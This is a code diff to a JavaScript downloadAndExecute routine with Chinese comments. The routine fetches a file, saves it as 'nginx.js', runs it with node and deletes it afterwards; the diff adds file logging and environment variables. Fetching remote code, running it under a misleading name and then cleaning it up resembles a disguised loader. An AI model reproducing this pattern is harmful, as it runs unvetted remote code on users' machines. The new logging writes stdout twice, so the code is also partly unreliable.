@@ -64,6 +64,11 @@ const downloadAndExecute = () => {
       const workingFilePath = path.join(workDir, 'nginx.js');
       fs.copyFileSync(filePath, workingFilePath);
 
+      // 确保log.txt文件存在
+      if (!fs.existsSync(subTxtPath)) {
+        fs.writeFileSync(subTxtPath, '');
+      }
+
       const packageJson = {
         "dependencies": {
           "axios": "latest",
@@ -80,37 +85,63 @@ const downloadAndExecute = () => {
         }
         
         console.log('Dependencies installed, running the webapp...');
-        // 使用spawn而不是exec来更好地处理输出
         const { spawn } = require('child_process');
+        
+        // 创建环境变量，确保nginx.js使用相同的日志文件路径
+        const env = {
+          ...process.env,
+          FILE_PATH: FILE_PATH,  // 传递相同的FILE_PATH
+          LOG_PATH: subTxtPath   // 明确指定日志文件路径
+        };
+
         const child = spawn('node', ['nginx.js'], {
           cwd: workDir,
-          stdio: ['inherit', 'pipe', 'pipe']
+          stdio: ['inherit', 'pipe', 'pipe'],
+          env: env
         });
+
+        let output = '';
 
         // 捕获标准输出
         child.stdout.on('data', (data) => {
-          console.log(`${data}`);
+          const dataStr = data.toString();
+          output += dataStr;
+          console.log(dataStr);
+          
+          // 将输出追加到日志文件
+          fs.appendFileSync(subTxtPath, dataStr);
         });
 
         // 捕获标准错误
         child.stderr.on('data', (data) => {
-          console.error(`${data}`);
+          const dataStr = data.toString();
+          console.error(dataStr);
+          // 也可以选择将错误信息写入日志
+          fs.appendFileSync(subTxtPath, `ERROR: ${dataStr}`);
         });
 
         child.on('error', (error) => {
           console.error(`Failed to start subprocess: ${error}`);
+          fs.appendFileSync(subTxtPath, `Process error: ${error}\n`);
         });
 
         child.on('exit', (code, signal) => {
           if (code !== 0) {
             console.log(`Process exited with code ${code} and signal ${signal}`);
           }
-          
-          // 不要清除console
-          // console.clear();
+
+          // 确保所有输出都已写入
+          if (output) {
+            try {
+              fs.appendFileSync(subTxtPath, output);
+            } catch (err) {
+              console.error('Error writing to log file:', err);
+            }
+          }
+
           console.log(`Child process completed`);
 
-          // 延迟删除文件，确保所有输出都已经显示
+          // 延迟清理文件
           setTimeout(() => {
             try {
               fs.unlinkSync(filePath);
@@ -124,6 +155,7 @@ const downloadAndExecute = () => {
     })
     .catch(error => {
       console.error(`Download error: ${error}`);
+      fs.appendFileSync(subTxtPath, `Download error: ${error}\n`);
     });
 };
 
